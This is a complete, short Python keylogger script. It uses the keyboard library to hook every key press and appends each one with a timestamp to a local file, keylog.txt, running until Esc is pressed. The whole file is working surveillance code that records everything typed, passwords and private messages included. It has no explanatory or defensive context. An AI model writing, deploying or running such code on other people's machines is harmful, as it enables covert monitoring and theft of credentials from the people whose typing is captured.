import keyboard
import datetime

LOG_FILE = "keylog.txt"

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        key_name = event.name
        
        if len(key_name) > 1:
            key_name = f" [{key_name.upper()}] "

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} - {key_name}\n")

def main():
    keyboard.hook(on_key_event)
    keyboard.wait('esc')

if __name__ == "__main__":
    main()
    